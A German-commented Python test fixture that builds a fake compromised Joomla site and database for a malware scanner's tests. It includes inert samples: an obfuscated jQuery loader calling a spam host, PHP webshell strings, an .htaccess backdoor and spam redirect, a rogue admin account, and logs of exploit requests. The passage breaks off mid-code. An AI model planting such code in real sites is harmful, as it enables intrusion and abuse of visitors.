"""Baut eine künstliche Joomla-Seite (sauber oder 'infiziert') für die Tests.

Alle 'Schadcode'-Beispiele sind inaktiv: Sie stehen nur als Text in Kommentaren oder
Zeichenketten und lösen lediglich die Erkennungsmuster aus. Nichts davon führt etwas aus.
"""
from __future__ import annotations

import gzip
import json
import os
os.environ.setdefault("CLAUDIA_NO_GEO", "1")        # Tests fragen keine Registry ab
import sqlite3
import stat
import time
from typing import Dict

DAY = 86400.0
os.environ.setdefault("CLAUDIA_OFFLINE", "1")      # Tests greifen nie auf das echte Internet zu (Online-Abgleich)


def w(path: str, text: str = "", days_ago: float = 900, mode: int = 0o644, binary: bool = False) -> str:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb" if binary else "w", **({} if binary else {"encoding": "utf-8"})) as fh:
        fh.write(text)
    t = time.time() - days_ago * DAY
    os.utime(path, (t, t))
    os.chmod(path, mode)
    return path


VERSION_PHP = """<?php
namespace Joomla\\CMS;
final class Version
{
    public const MAJOR_VERSION = 6;
    public const MINOR_VERSION = 2;
    public const PATCH_VERSION = 0;
    public const EXTRA_VERSION = '';
    public const DEV_STATUS = 'Stable';
}
"""

CONFIG_CLEAN = """<?php
class JConfig
{
    public $offline = false;
    public $sitename = 'Testseite';
    public $debug = false;
    public $error_reporting = 'default';
    public $dbtype = 'mysqli';
    public $host = 'localhost';
    public $user = 'dbuser_test';
    public $password = 'GEHEIM-DB-PASSWORT';
    public $db = 'dbtest';
    public $dbprefix = 'j_';
    public $secret = 'GEHEIMES-SECRET-123';
    public $tmp_path = '/home/test/html/site/tmp';
    public $log_path = '/home/test/html/site/administrator/logs';
    public $mailer = 'mail';
    public $smtppass = '';
    public $ftp_enable = 0;
    public $session_handler = 'database';
    public $lifetime = 60;
}
"""

CONFIG_INFECTED = CONFIG_CLEAN.replace("public $debug = false;", "public $debug = true;").replace(
    "'/home/test/html/site/tmp'", "'/home/test/html/site/tmp/'") + """
// CLAUDIA-TESTDATEI: unerwartete Zeile am Ende
@include('/tmp/.cache_x.php');
"""

INDEX_PHP = """<?php
define('_JEXEC', 1);
if (version_compare(PHP_VERSION, '8.1.0', '<')) { die('PHP zu alt'); }
require_once __DIR__ . '/includes/app.php';
"""

HTACCESS_CLEAN = """## Joomla Standard
RewriteEngine On
RewriteCond %{HTTPS} !=on
RewriteRule .* "https://%{HTTP_HOST}%{REQUEST_URI}" [R=301,L,NE]
RewriteCond %{REQUEST_URI} !^/index\\.php
RewriteRule .* index.php [L]
RewriteCond %{QUERY_STRING} "base64_(en|de)code\\(" [NC,OR]
RewriteRule .* - [F]
"""

HTACCESS_INFECTED = HTACCESS_CLEAN + """
# CLAUDIA-TESTDATEI
php_value auto_prepend_file /home/test/html/site/tmp/.cache_x.php
RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|yandex) [NC]
RewriteRule ^(.*)$ https://spam-pharma.example/$1 [R=302,L]
"""

JQUERY_REAL_HEAD = "/*! jQuery v3.6.3 | (c) OpenJS Foundation and other contributors | jquery.org/license */\n!function(e,t){\"use strict\";}(window);"

JQUERY_INFECTED = (
    "var _0x1a2b=['aHR0cHM6Ly9jZG4ud2hpdGVsbGxsc2hvcC5pY3U=','cHJvdG8='];(function(_0x3c4d,_0x5e6f){var _0x7a8b=function(_0x9c0d){while(--_0x9c0d){_0x3c4d['push'](_0x3c4d['shift']());}};_0x7a8b(++_0x5e6f);}(_0x1a2b,0x1f4));"
    "var _0x2f3e=function(_0x4a5b,_0x6c7d){_0x4a5b=_0x4a5b-0x0;return _0x1a2b[_0x4a5b];};"
    "function clkk(){var _0x8e9f=new XMLHttpRequest();_0x8e9f['open']('GET',String['fromCharCode'](104,116,116,112,115)+'://cdn.whitellllshop.icu/landers/type.php');_0x8e9f['send']();}\n"
    "/*! jQuery v3.7.1 | (c) OpenJS Foundation */\n!function(e,t){\"use strict\";}(window);"
)

PHP_TEST_SHELL = """<?php
// CLAUDIA-TESTDATEI (inaktiv): enthaelt nur Text, der die Erkennung ausloest
echo 'eval(base64_decode($_POST["x"]));';
echo 'FilesMan';
"""

PHP_TIER2 = """<?php
// CLAUDIA-TESTDATEI: harmlos, nutzt base64_decode wie viele Erweiterungen
$data = base64_decode('SGFsbG8=');
echo $data;
"""

PHP_VENDOR = """<?php
// Bibliothek, nutzt base64_decode legitim
function decodeThing($x) { return base64_decode($x); }
"""


def manifest(name: str, version: str, author: str, ext_type: str, group: str = "", date: str = "2026-08-14") -> str:
    g = ' group="%s"' % group if group else ""
    return ('<?xml version="1.0" encoding="utf-8"?>\n<extension type="%s"%s method="upgrade">\n'
            "  <name>%s</name>\n  <author>%s</author>\n  <creationDate>%s</creationDate>\n  <version>%s</version>\n</extension>\n"
            % (ext_type, g, name, author, date, version))


def realistic_benign(site: str) -> None:
    """Dateien, die auf echten Joomla-Seiten vorkommen und frueher faelschlich gemeldet wurden."""
    # Bilder/Schriften, in deren Binaerdaten zufaellig '<?=' vorkommt
    blob = b"\xff\xd8\xff\xe0\x00\x10JFIF" + bytes(range(1, 60)) + b"<?=" + bytes(range(100, 200)) * 3
    w(site + "/images/bilder/foto.jpg", blob, binary=True)
    w(site + "/images/bilder/banner.webp", b"RIFF\x00\x00\x00\x00WEBPVP8 " + b"<?=" + b"\x00\x01\x02" * 40, binary=True)
    w(site + "/media/vendor/fontawesome-free/webfonts/fa-solid-900.woff2", b"wOF2\x00\x01\x00\x00" + b"<?=" + b"\x03" * 64, binary=True)
    # leere Platzhalter-Datei in media
    w(site + "/media/plg_system_nrframework/css/vendor/images/index.php", "")
    # Joomla-Cache: reine Daten ohne die()-Zeile
    w(site + "/administrator/cache/autoload_psr4.php", "<?php\n// Generated\nreturn array (\n  'Joomla\\\\CMS' => '/x',\n);\n", days_ago=3)
    w(site + "/administrator/cache/language/administrator-language-en-GB-joomla.ini.1791820872.php", "<?php return ['A' => 'b'];", days_ago=3)
    # Namen, die in Joomla und Erweiterungen ueblich sind
    w(site + "/layouts/joomla/form/field/radio.php", "<?php\ndefined('_JEXEC') or die;\n", days_ago=20)
    w(site + "/plugins/fields/radio/tmpl/radio.php", "<?php\ndefined('_JEXEC') or die;\n", days_ago=20)
    w(site + "/plugins/fields/radio/src/Extension/Radio.php", "<?php\ndefined('_JEXEC') or die;\n", days_ago=20)
    w(site + "/.php-cs-fixer.dist.php", "<?php\nreturn [];\n", days_ago=900)
    # SQL-Skripte der Installation und ein im Elternordner geschuetzter Ordner
    w(site + "/administrator/components/com_demo/sql/updates/mysql/1.0.0-20210321.sql", "ALTER TABLE x ADD y INT;\n", days_ago=30)
    w(site + "/administrator/_protected/.htaccess", "<IfModule mod_authz_core.c>\n  Require all denied\n</IfModule>\n", days_ago=900)
    w(site + "/administrator/_protected/coreref/core-6.1.3.zip", "Z" * 200_000, days_ago=30)
    # Schutzregeln in .htaccess-Dateien
    w(site + "/media/plg_system_cgwebp/_cache/.htaccess",
      "<IfModule mod_rewrite.c>\n</IfModule>\nAddHandler cgi-script .php .pl .py .jsp .asp .sh .cgi\nOptions -ExecCGI\n", days_ago=30)
    # JavaScript: Joomlas noConflict-Dateien und ein jQuery-Plugin einer Erweiterung
    w(site + "/media/vendor/jquery/js/jquery-noconflict.min.js", "window.$=jQuery.noConflict();\n", days_ago=30)
    w(site + "/media/vendor/jquery/js/jquery-noconflict.js", "window.$ = jQuery.noConflict();\n", days_ago=30)
    w(site + "/build/media_source/legacy/js/jquery-noconflict.es5.js", "var $ = jQuery.noConflict();\n", days_ago=900)
    w(site + "/media/com_osmeta/js/jquery.osmetacharcount.js", "(function($) {\n  $.fn.osmetaCharCount = function charCount(args){ return this; };\n})(jQuery);\n", days_ago=30)
    # Convert Forms: Untererweiterungen mit eigener Versionsnummer 1.0
    w(site + "/modules/mod_convertforms/mod_convertforms.xml", manifest("mod_convertforms", "1.0", "Tassos Marinos", "module"))
    w(site + "/plugins/system/convertforms/convertforms.xml", manifest("PLG_SYSTEM_CONVERTFORMS", "1.0", "Tassos Marinos", "plugin", "system"))
    # Update-Welle: viele Dateien mit base64_decode, alle in derselben Stunde geaendert (Joomla-Update)
    stamp = time.time() - 10 * DAY
    for i in range(12):
        path = w(site + "/plugins/multifactorauth/mfa%d/src/Extension/Mfa%d.php" % (i, i), PHP_VENDOR)
        os.utime(path, (stamp, stamp))
    # Erweiterung, die vor 20 Tagen aktualisiert wurde: Dateien und Manifest tragen dasselbe Datum
    w(site + "/plugins/system/updated/updated.xml", manifest("plg_system_updated", "3.1.0", "Acme", "plugin", "system"), days_ago=20)
    for n in ("A", "B"):
        w(site + "/plugins/system/updated/src/%s.php" % n, PHP_VENDOR, days_ago=20)
    # Datentabelle mit sehr langer Zeile, aber ohne Befehle
    w(site + "/plugins/system/iconlist/src/Icons.php", "<?php\nreturn [" + ",".join("'fa-%d'" % i for i in range(900)) + "];\n", days_ago=20)


def build_site(root: str, infected: bool = True) -> str:
    """Erzeugt <root>/html/site und liefert den Pfad. Home ist <root>."""
    site = os.path.join(root, "html", "site")
    os.makedirs(site, exist_ok=True)

    # --- Joomla-Kern
    w(site + "/libraries/src/Version.php", VERSION_PHP)
    w(site + "/administrator/manifests/files/joomla.xml", manifest("files_joomla", "6.2.0", "Joomla! Project", "file"))
    w(site + "/index.php", INDEX_PHP, days_ago=12)
    w(site + "/administrator/index.php", INDEX_PHP, days_ago=12)
    w(site + "/api/index.php", INDEX_PHP, days_ago=900)
    w(site + "/includes/app.php", "<?php\n// Joomla app\n", days_ago=12)
    w(site + "/configuration.php", CONFIG_INFECTED if infected else CONFIG_CLEAN, days_ago=8, mode=0o444)
    w(site + "/.htaccess", HTACCESS_INFECTED if infected else HTACCESS_CLEAN, days_ago=5 if infected else 40)
    w(site + "/.user.ini", "session.cookie_httponly = 1\n", days_ago=500)
    w(site + "/robots.txt", "User-agent: *\nDisallow: /administrator/\n", days_ago=200)
    w(site + "/htaccess.txt", HTACCESS_CLEAN, days_ago=12)
    w(site + "/README.txt", "Joomla", days_ago=12)
    for d in ("cache", "tmp", "images", "media", "language", "layouts", "modules", "components", "administrator/logs"):
        w(site + "/%s/index.html" % d, "<html><body></body></html>")
    # Entwickler-Altlasten (harmlos)
    w(site + "/.drone.yml", "kind: pipeline\n")
    w(site + "/composer.json", "{}")
    w(site + "/phpunit.xml.dist", "<phpunit/>")
    w(site + "/htaccess.old", HTACCESS_CLEAN, days_ago=400)

    # --- Templates
    w(site + "/templates/gt_yoga/templateDetails.xml", manifest("gt_yoga", "1.2.0", "Galussothemes", "template"))
    w(site + "/templates/gt_yoga/index.php",
      "<?php\ndefined('_JEXEC') or die;\n// Elfsight\n?>\n<script src=\"https://static.elfsight.com/platform/platform.js\" async></script>\n", days_ago=30)
    w(site + "/templates/gt_yoga/error.php", "<?php\ndefined('_JEXEC') or die;\n", days_ago=300)
    w(site + "/templates/cassiopeia/templateDetails.xml", manifest("cassiopeia", "6.2.0", "Joomla! Project", "template"))
    w(site + "/templates/cassiopeia/index.php", "<?php\ndefined('_JEXEC') or die;\n", days_ago=12)

    # --- Erweiterungen (JCE, Convert Forms, Tassos verwundbar -> Test fuer Advisories)
    w(site + "/administrator/components/com_jce/jce.xml", manifest("COM_JCE", "2.9.99.3" if infected else "2.9.99.7", "Ryan Demmer", "component"))
    w(site + "/plugins/editors/jce/jce.xml", manifest("plg_editors_jce", "2.9.99.3" if infected else "2.9.99.7", "Ryan Demmer", "plugin", "editors"))
    w(site + "/administrator/components/com_convertforms/convertforms.xml", manifest("COM_CONVERTFORMS", "5.2.4" if infected else "5.2.5", "Tassos Marinos", "component"))
    w(site + "/plugins/system/nrframework/nrframework.xml", manifest("plg_system_nrframework", "6.0.60" if infected else "6.0.62", "Tassos Marinos", "plugin", "system"))
    w(site + "/plugins/system/helixultimate/helixultimate.xml", manifest("plg_system_helixultimate", "2.2.8", "JoomShaper", "plugin", "system"))
    w(site + "/administrator/components/com_osmap/osmap.xml", manifest("COM_OSMAP", "5.1.11", "Joomlashack", "component"))
    w(site + "/administrator/components/com_akeebabackup/akeebabackup.xml", manifest("COM_AKEEBABACKUP", "10.4.0", "Akeeba Ltd", "component"))
    if infected:
        w(site + "/plugins/system/t4/t4.xml", manifest("plg_system_t4", "2.6.2", "JoomlArt", "plugin", "system"), days_ago=68)  # in DB nicht registriert -> verwaist
        w(site + "/plugins/system/t4/t4.php", "<?php\n// T4\n", days_ago=68)
        w(site + "/components/com_x/index.html", "<html></html>")
    w(site + "/plugins/system/vendorlib/vendorlib.xml", manifest("plg_system_vendorlib", "1.0.0", "Acme", "plugin", "system"))
    w(site + "/plugins/system/vendorlib/src/Lib.php", PHP_VENDOR)
    w(site + "/libraries/vendor/acme/lib/Decoder.php", PHP_VENDOR)

    # --- Upload-Ordner (Schutz)
    w(site + "/images/.htaccess", "<FilesMatch \"\\.(php|phtml|pht|phps|phar)$\">\n  Require all denied\n</FilesMatch>\n")
    w(site + "/images/logo.jpg", "GIF89a" + "x" * 50, days_ago=600)

    # --- Realistische Unauffaelligkeiten (fruehere Fehlalarme: muessen in beiden Seiten ruhig bleiben)
    realistic_benign(site)

    # --- Akeeba-Backups: ein geschuetzter und ein offener Ordner
    if infected:
        w(site + "/administrator/components/com_akeebabackup/Backup-Open/site-2026.jpa", "J" * 300_000, days_ago=40)
    w(site + "/administrator/components/com_akeebabackup/Backup-Safe/site-2026.jpa", "J" * 300_000, days_ago=40)
    w(site + "/administrator/components/com_akeebabackup/Backup-Safe/.htaccess", "Require all denied\n")

    # --- Protokolle
    w(site + "/administrator/logs/joomla_error.php", "#\n#<?php die('Forbidden.'); ?>\n#Date: 2026-10-01\n#Fields: datetime\tpriority\tmessage\n2026-10-01\tERROR\tLogin failed for admin\n", days_ago=20)
    w(site + "/administrator/logs/1.convertforms_errors.php", "#\n#<?php die('Forbidden.'); ?>\n2026-10-02\tERROR\tsubmit ok\n", days_ago=20)

    # --- Weitere Installation auf demselben Webspace
    v2 = VERSION_PHP if not infected else VERSION_PHP.replace("MAJOR_VERSION = 6", "MAJOR_VERSION = 4").replace("MINOR_VERSION = 2", "MINOR_VERSION = 4").replace("PATCH_VERSION = 0", "PATCH_VERSION = 1")
    w(root + "/html/site2/libraries/src/Version.php", v2)
    w(root + "/html/site2/configuration.php", CONFIG_CLEAN)
    w(root + "/html/blog/wp-config.php", "<?php\n// WordPress\n")

    if infected:
        # Manipuliertes jQuery in node_modules (das Original aus dem Vorfall, entschaerft)
        w(site + "/node_modules/jquery/dist/jquery.min.js", JQUERY_INFECTED, days_ago=130)
        w(site + "/node_modules/jquery/package.json", json.dumps({"name": "jquery", "version": "3.6.3"}), days_ago=900)
        w(site + "/node_modules/other/lib.js", "(function(){return 1})();", days_ago=900)
        # Hintertuer in Upload-Ordner (inaktiv)
        w(site + "/images/shell.php", PHP_TEST_SHELL, days_ago=3)
        w(site + "/images/.cache.ico", "<?php echo 1; ?>" + "A" * 30, days_ago=3)
        w(site + "/tmp/up.php", PHP_TEST_SHELL, days_ago=3)
        w(site + "/up.php", PHP_TEST_SHELL, days_ago=3)
        w(site + "/cache/x1.php", "<?php\n$a = $_POST['k'];\n", days_ago=3)
        w(site + "/administrator/cache/language/administrator-language-en-GB-en-GB.com_demo.ini.1790444481.php",
          "<?php return ['COM_DEMO_DESC' => 'Blockiert Anfragen mit base64_decode( im Text'];", days_ago=3)
        w(site + "/templates/cassiopeia/index.php", "<?php\ndefined('_JEXEC') or die;\n?>\n<script src=\"https://cdn.whitellllshop.icu/a.js\"></script>\n", days_ago=3)
        w(site + "/components/com_x/obf.php", PHP_TIER2, days_ago=2)
        w(site + "/.env", "APP_KEY=x\n", days_ago=10)
        w(site + "/media/.htaccess", "AddType application/x-httpd-php .jpg\n", days_ago=3)
        # Manipuliertes eigenes jQuery in media
        w(site + "/media/vendor/jquery/js/jquery.min.js", JQUERY_INFECTED, days_ago=3)
        w(site + "/administrator/logs/1.convertforms_errors.php",
          "#\n#<?php die('Forbidden.'); ?>\n2026-10-02\tERROR\tsubmit payload <?php system($_GET['c']); ?> ../../etc/passwd\n", days_ago=2)
        # Offener Ordner mit SQL-Dump
        w(site + "/plugins/system/demo/sql/install.mysql.utf8.sql", "CREATE TABLE a (id INT);\nINSERT INTO `#__users` (name, username) VALUES ('x','y');\n", days_ago=3)
        w(site + "/backup/dump.sql", "-- dump\n" + "INSERT INTO x VALUES (1);\n" * 100, days_ago=20)
    else:
        w(site + "/media/vendor/jquery/js/jquery.min.js", JQUERY_REAL_HEAD, days_ago=12)

    # --- Zugriffsprotokolle (ausserhalb des Webroot): ~/logs
    lines = []
    for i in range(30):
        lines.append('203.0.113.%d - - [%02d/Oct/2026:10:%02d:00 +0200] "GET /index.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"' % (10 + i % 5, 1 + i % 20, i))
    if infected:
        lines += [
            '198.51.100.7 - - [15/Jun/2026:03:12:11 +0200] "POST /administrator/index.php?option=com_jce&task=profiles.import&format=json HTTP/1.1" 200 88 "-" "curl/8.1"',
            '198.51.100.7 - - [15/Jun/2026:03:12:19 +0200] "GET /tmp/x7k2.php?c=id HTTP/1.1" 200 12 "-" "curl/8.1"',
            '198.51.100.9 - - [16/Jun/2026:11:00:00 +0200] "POST /index.php?option=com_ajax&plugin=nrframework&task=include&format=raw HTTP/1.1" 200 5 "-" "python-requests/2.31"',
            '198.51.100.9 - - [16/Jun/2026:11:00:05 +0200] "GET /images/shell.php HTTP/1.1" 200 5 "-" "python-requests/2.31"',
            '198.51.100.11 - - [17/Jun/2026:04:00:00 +0200] "GET /index.php?id=1%20union%20select%201,2,3-- HTTP/1.1" 404 5 "-" "sqlmap"',
        ]
    os.makedirs(root + "/logs", exist_ok=True)
    w(root + "/logs/access.log", "\n".join(lines[: len(lines) // 2]) + "\n", days_ago=1)
    gz = root + "/logs/access.log.1.gz"
    with gzip.open(gz, "wt", encoding="utf-8") as fh:
        fh.write("\n".join(lines[len(lines) // 2:]) + "\n")
    t = time.time() - 30 * DAY
    os.utime(gz, (t, t))
    return site


# ---------------------------------------------------------------- Datenbank (SQLite als Ersatz fuer MySQL)
SCHEMA = """
CREATE TABLE j_users (id INTEGER PRIMARY KEY, name TEXT, username TEXT, email TEXT, block INTEGER, registerDate TEXT, lastvisitDate TEXT, requireReset INTEGER);
CREATE TABLE j_usergroups (id INTEGER PRIMARY KEY, parent_id INTEGER, title TEXT);
CREATE TABLE j_user_usergroup_map (user_id INTEGER, group_id INTEGER);
CREATE TABLE j_user_profiles (user_id INTEGER, profile_key TEXT, profile_value TEXT, ordering INTEGER);
CREATE TABLE j_wf_profiles (id INTEGER PRIMARY KEY, name TEXT, description TEXT, users TEXT, types TEXT, components TEXT, area INTEGER, device TEXT, rows TEXT, plugins TEXT, published INTEGER, ordering INTEGER, params TEXT);
CREATE TABLE j_content (id INTEGER PRIMARY KEY, title TEXT, introtext TEXT, `fulltext` TEXT, state INTEGER, modified TEXT);
CREATE TABLE j_modules (id INTEGER PRIMARY KEY, title TEXT, module TEXT, content TEXT, params TEXT, published INTEGER);
CREATE TABLE j_template_styles (id INTEGER PRIMARY KEY, template TEXT, client_id INTEGER, home TEXT, title TEXT, params TEXT);
CREATE TABLE j_extensions (extension_id INTEGER PRIMARY KEY, name TEXT, type TEXT, element TEXT, folder TEXT, client_id INTEGER, enabled INTEGER, manifest_cache TEXT, params TEXT, protected INTEGER DEFAULT 0);
CREATE TABLE j_session (session_id TEXT, client_id INTEGER, guest INTEGER, time TEXT, data TEXT, userid INTEGER, username TEXT);
CREATE TABLE j_action_logs (id INTEGER PRIMARY KEY, message_language_key TEXT, message TEXT, log_date TEXT, extension TEXT, user_id INTEGER, item_id INTEGER, ip_address TEXT);
CREATE TABLE j_redirect_links (id INTEGER PRIMARY KEY, old_url TEXT, new_url TEXT, published INTEGER, created_date TEXT, referer TEXT);
CREATE TABLE j_menu (id INTEGER PRIMARY KEY, title TEXT, link TEXT, type TEXT, published INTEGER, params TEXT);
CREATE TABLE j_scheduler_tasks (id INTEGER PRIMARY KEY, title TEXT, type TEXT, state INTEGER, last_execution TEXT, next_execution TEXT);
"""


def _ts(days_ago: float) -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(time.time() - days_ago * DAY))


def _mc(version: str, author: str, date: str = "2026-08-14") -> str:
    return json.dumps({"version": version, "author": author, "creationDate": date})


def build_db(path: str, infected: bool = True) -> None:
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(SCHEMA)
    c = con.cursor()
    c.executemany("INSERT INTO j_usergroups VALUES (?,?,?)", [(1, 0, "Public"), (2, 1, "Registered"), (7, 6, "Administrator"), (8, 0, "Super Users")])
    c.execute("INSERT INTO j_users VALUES (1,'Chef','chef','chef@example.org',0,?,?,0)", (_ts(900), _ts(1)))
    c.execute("INSERT INTO j_user_usergroup_map VALUES (1,8)")
    c.execute("INSERT INTO j_users VALUES (2,'Support','support-hoster','support@example.org',1,?,?,0)", (_ts(200), _ts(100)))
    c.execute("INSERT INTO j_user_usergroup_map VALUES (2,8)")
    c.execute("INSERT INTO j_users VALUES (3,'Leser','leser','leser@example.org',0,?,?,0)", (_ts(300), _ts(50)))
    c.execute("INSERT INTO j_user_usergroup_map VALUES (3,2)")

    c.executemany("INSERT INTO j_wf_profiles (id,name,description,users,types,components,area,device,rows,plugins,published,ordering,params) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)", [
        (1, "Default", "Standard", "", "", "", 0, "desktop,tablet,phone", "", "browser,filemanager", 1, 1, json.dumps({"editor": {"upload": {"filetypes": "jpg,png,gif,pdf"}}})),
        (2, "Front End", "Front", "", "", "", 1, "desktop,tablet,phone", "", "browser", 1, 2, json.dumps({"editor": {}})),
    ])
    c.executemany("INSERT INTO j_content (id,title,introtext,`fulltext`,state,modified) VALUES (?,?,?,?,?,?)", [
        (1, "Willkommen", "<p>Hallo Welt</p>", "", 1, _ts(30)),
        (2, "Kontakt", "<p>Karte</p><script src=\"https://static.elfsight.com/platform/platform.js\" async></script>", "", 1, _ts(30)),
    ])
    c.executemany("INSERT INTO j_modules (id,title,module,content,params,published) VALUES (?,?,?,?,?,?)", [
        (1, "Menü", "mod_menu", "", "{}", 1),
    ])
    c.execute("INSERT INTO j_template_styles VALUES (13,'gt_yoga',0,'1','gt_yoga - Default',?)",
              (json.dumps({"before_head": "<script>(function(w,d,s,l,i){w[l]=w[l]||[];})(window,document,'script','dataLayer','GTM-AAAA111');</script>\n<script async src=\"https://www.googletagmanager.com/gtm.js?id=GTM-AAAA111\"></script>"}),))
    ext_rows = [
        (1, "files_joomla", "file", "joomla", "", 0, 1, _mc("6.2.0", "Joomla! Project"), "{}"),
        (2, "COM_JCE", "component", "com_jce", "", 1, 1, _mc("2.9.99.3" if infected else "2.9.99.7", "Ryan Demmer"), "{}"),
        (3, "plg_editors_jce", "plugin", "jce", "editors", 0, 1, _mc("2.9.99.3" if infected else "2.9.99.7", "Ryan Demmer"), "{}"),
        (4, "COM_CONVERTFORMS", "component", "com_convertforms", "", 1, 1, _mc("5.2.4" if infected else "5.2.5", "Tassos Marinos"), "{}"),
        (5, "plg_system_nrframework", "plugin", "nrframework", "system", 0, 1, _mc("6.0.60" if infected else "6.0.62", "Tassos Marinos"), "{}"),
        (6, "plg_system_helixultimate", "plugin", "helixultimate", "system", 0, 1, _mc("2.2.8", "JoomShaper"), "{}"),
        (7, "COM_OSMAP", "component", "com_osmap", "", 1, 1, _mc("5.1.11", "Joomlashack"), "{}"),
        (8, "COM_AKEEBABACKUP", "component", "com_akeebabackup", "", 1, 1, _mc("10.4.0", "Akeeba Ltd"), "{}"),
        (9, "gt_yoga", "template", "gt_yoga", "", 0, 1, _mc("1.2.0", "Galussothemes"), "{}"),
        (10, "cassiopeia", "template", "cassiopeia", "", 0, 1, _mc("6.2.0", "Joomla! Project"), "{}"),
        (12, "plg_system_vendorlib", "plugin", "vendorlib", "system", 0, 1, _mc("1.0.0", "Acme"), "{}"),
    ]
    # Erweiterungen aus realistic_benign(): vollstaendig registriert, damit sie nicht als verwaist gelten
    extra = [("plg_fields_radio", "plugin", "radio", "fields"), ("plg_system_iconlist", "plugin", "iconlist", "system"),
             ("PLG_SYSTEM_CONVERTFORMS", "plugin", "convertforms", "system"), ("mod_convertforms", "module", "mod_convertforms", ""),
             ("COM_DEMO", "component", "com_demo", ""),
             ("plg_system_updated", "plugin", "updated", "system")]
    extra += [("plg_multifactorauth_mfa%d" % i, "plugin", "mfa%d" % i, "multifactorauth") for i in range(12)]
    for n, (nm, ty, el, fo) in enumerate(extra):
        ext_rows.append((100 + n, nm, ty, el, fo, 0, 1, _mc("1.0", "Tassos Marinos"), "{}"))
    if infected:
        ext_rows.append((11, "plg_system_ghost", "plugin", "ghost", "system", 0, 1, _mc("1.0", "Unbekannt"), "{}"))   # in DB, aber keine Dateien
    c.executemany("INSERT INTO j_extensions (extension_id, name, type, element, folder, client_id, enabled, manifest_cache, params) VALUES (?,?,?,?,?,?,?,?,?)", ext_rows)
    c.execute("INSERT INTO j_action_logs VALUES (1,'PLG_ACTIONLOG_JOOMLA_USER_LOGGED_IN','{\"username\":\"chef\"}',?, 'com_users',1,1,'203.0.113.5')", (_ts(2),))
    c.execute("INSERT INTO j_action_logs VALUES (2,'PLG_ACTIONLOG_JOOMLA_EXTENSION_UNINSTALLED','{\"extension_name\":\"plg_system_t4\"}',?, 'com_installer',1,0,'203.0.113.5')", (_ts(1),))
    c.execute("INSERT INTO j_menu VALUES (1,'Home','index.php?option=com_content&view=featured','component',1,'{}')")

    if infected:
        c.execute("INSERT INTO j_users VALUES (4,'Systemuser','sysop','sys@mail.example.net',0,?,NULL,0)", (_ts(12),))
        c.execute("INSERT INTO j_user_usergroup_map VALUES (4,8)")
        c.execute("INSERT INTO j_user_profiles VALUES (4,'joomlatoken.enabled','1',1)")
        c.execute("INSERT INTO j_user_profiles VALUES (4,'joomlatoken.token','abc',2)")
        c.execute("INSERT INTO j_wf_profiles (id,name,description,users,types,components,area,device,rows,plugins,published,ordering,params) VALUES (3,'Updater','x','','','',0,'desktop','','filemanager',1,3,?)",
                  (json.dumps({"editor": {"upload": {"filetypes": "jpg,png,php,phtml"}}}),))
        c.execute("INSERT INTO j_content (id,title,introtext,`fulltext`,state,modified) VALUES (3,'Angebot','<p>Hi</p><script src=\"https://cdn.whitellllshop.icu/landers/type.php\"></script>','',1,?)", (_ts(10),))
        c.execute("INSERT INTO j_modules (id,title,module,content,params,published) VALUES (2,'Zähler','mod_custom','<iframe src=\"https://spam-pharma.example/x\" style=\"display:none\"></iframe>','{}',1)")
        c.execute("INSERT INTO j_redirect_links (id, old_url, new_url, published, created_date) VALUES (1,'/alt','https://casino-spam.example/in',1,?)", (_ts(9),))
        c.execute("INSERT INTO j_action_logs VALUES (3,'PLG_ACTIONLOG_JOOMLA_USER_REGISTERED','{\"username\":\"sysop\"}',?, 'com_users',0,4,'198.51.100.7')", (_ts(12),))
        c.execute("INSERT INTO j_action_logs VALUES (4,'PLG_ACTIONLOG_JOOMLA_EXTENSION_INSTALLED','{\"extension_name\":\"obscure\"}',?, 'com_installer',4,0,'198.51.100.7')", (_ts(12),))
    con.commit()
    con.close()


MYSQL_SHIM = r'''#!/usr/bin/env python3
"""Testattrappe fuer das mysql-Programm: fuehrt SQL gegen eine SQLite-Datei aus (nur fuer Tests)."""
import os, re, sqlite3, sys

args = sys.argv[1:]
sql = None
db_path = os.environ.get("CLAUDIA_TEST_DB", "")
i = 0
positional = []
while i < len(args):
    a = args[i]
    if a in ("-e", "--execute"):
        sql = args[i + 1]; i += 2; continue
    if a in ("-h", "-P", "-u", "-S") or a in ("--host", "--port", "--user", "--socket"):
        i += 2; continue
    if a.startswith("--") or a in ("-B", "-N", "-s"):
        if a == "--version" or a == "-V":
            print("mysql  Ver 15.1 Distrib 10.6.0-MariaDB (test-shim)"); sys.exit(0)
        i += 1; continue
    positional.append(a); i += 1

if os.environ.get("MYSQL_PWD", "") != os.environ.get("CLAUDIA_TEST_PW", "GEHEIM-DB-PASSWORT"):
    sys.stderr.write("ERROR 1045 (28000): Access denied for user (using password: YES)\n"); sys.exit(1)
if sql is None:
    sys.stderr.write("kein SQL\n"); sys.exit(1)

con = sqlite3.connect(db_path)
con.create_function("LOCATE", 2, lambda needle, hay: (hay or "").lower().find((needle or "").lower()) + 1)
con.create_function("SUBSTRING", 3, lambda s, a, b: (s or "")[a - 1:a - 1 + b])
con.create_function("JSON_UNQUOTE", 1, lambda x: x)
con.create_function("CONCAT", -1, lambda *xs: "".join("" if x is None else str(x) for x in xs))
con.create_function("NOW", 0, lambda: "2026-10-26 00:00:00")
con.create_function("LEFT", 2, lambda s, n: (s or "")[:n])
con.create_function("VERSION", 0, lambda: "11.8.2-MariaDB-test")
con.create_function("DATABASE", 0, lambda: "dbtest")
con.create_function("IF", 3, lambda c, a, b: a if c else b)
import time as _t
con.create_function("regexp", 2, lambda pat, s: 1 if re.search(pat or "", s or "", re.I) else 0)
con.create_function("REGEXP_INSTR", 2, lambda s, pat: (lambda m: m.start() + 1 if m else 0)(re.search(pat or "", s or "", re.I)))
con.create_function("GREATEST", 2, lambda a, b: max(a, b))
con.create_function("UNHEX", 1, lambda h: bytes.fromhex(h or "").decode("utf-8"))
con.create_function("CHAR_LENGTH", 1, lambda s: len(s or ""))
con.create_function("CURRENT_USER", 0, lambda: "wp_user@localhost")
sql = sql.replace("@@local_infile", "0").replace("@@secure_file_priv", "''").replace("@@version_comment", "'MariaDB test build'")
if sql.strip().upper().startswith("SHOW GRANTS"):
